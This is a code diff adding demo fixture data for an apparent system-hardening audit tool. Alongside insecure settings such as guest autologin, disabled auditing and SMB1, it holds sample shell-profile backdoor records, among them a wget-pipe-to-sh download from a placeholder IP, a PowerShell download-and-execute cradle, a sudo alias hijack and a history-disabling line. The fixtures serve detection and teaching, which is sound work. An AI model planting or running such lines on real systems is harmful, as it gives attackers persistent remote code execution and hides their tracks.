@@ -511,3 +511,77 @@ export const demoReadmeHits = [
   { path: "/home/alice/Desktop/README.txt", keyword: "unauthorized", line: "Unauthorized FTP should not be running." },
   { path: "C:\\Users\\alice\\Desktop\\README.txt", keyword: "prohibited", line: "Remove prohibited games and sample content." },
 ];
+
+export const demoShellBackdoors: FileRecord[] = [
+  { path: "/home/zygote/.bashrc", kind: "file", mode: "0644", owner: "zygote", note: "alias sudo='echo pwned'" },
+  { path: "/etc/profile.d/backdoor.sh", kind: "file", mode: "0755", owner: "root", note: "wget -qO- http://10.13.37.1/p.sh | sh" },
+  { path: "/root/.bashrc", kind: "file", mode: "0644", owner: "root", note: "unset HISTFILE" },
+  { path: "C:\\Users\\alice\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1", kind: "file", note: "Invoke-Expression (New-Object Net.WebClient).DownloadString(...)" },
+];
+
+export const demoDisplayManager = {
+  lightdmAllowGuest: true,
+  lightdmAutologin: "zygote",
+  gdmAutomaticLoginEnable: true,
+  gdmAutomaticLogin: "zygote",
+};
+
+export const demoHostConf = {
+  path: "/etc/host.conf",
+  order: "bind,hosts",
+  multi: "on",
+  nospoof: "off",
+};
+
+export const demoFail2ban = {
+  installed: false,
+  active: false,
+  packageAvailable: true,
+};
+
+export const demoMalwareTools = {
+  clamav: false,
+  chkrootkit: false,
+  lastScan: null as string | null,
+  hits: [] as string[],
+};
+
+export const demoSfc = {
+  command: "sfc /verifyonly",
+  violations: [
+    { path: "C:\\Windows\\System32\\drivers\\etc\\hosts.dll", detail: "hash mismatch (plant)" },
+    { path: "C:\\Windows\\System32\\notepad.exe", detail: "hash mismatch" },
+  ],
+};
+
+export const demoAuditPolicy = {
+  "Account Logon": "No Auditing",
+  "Account Management": "Success",
+  "Logon/Logoff": "No Auditing",
+  "Policy Change": "No Auditing",
+  "Privilege Use": "No Auditing",
+  System: "No Auditing",
+};
+
+export const demoRemoteServices = {
+  RemoteRegistry: { state: "running", startType: "Automatic" },
+  RemoteAssistance: { fAllowToGetHelp: 1, fAllowFullControl: 1 },
+};
+
+export const demoOptionalFeatures = [
+  { name: "TelnetClient", state: "Enabled" },
+  { name: "TFTP", state: "Enabled" },
+  { name: "SMB1Protocol", state: "Enabled" },
+  { name: "SimpleTCP", state: "Enabled" },
+];
+
+export const demoSecurityTemplate = {
+  path: "config/windows/cp-baseline.inf",
+  MinimumPasswordLength: 14,
+  PasswordComplexity: 1,
+  LockoutBadCount: 5,
+  EnableGuestAccount: 0,
+  AuditLogonEvents: 3,
+};
+
+export const DEFAULT_DEMO_ADMINS = ["root", "alice", "Administrator"] as const;
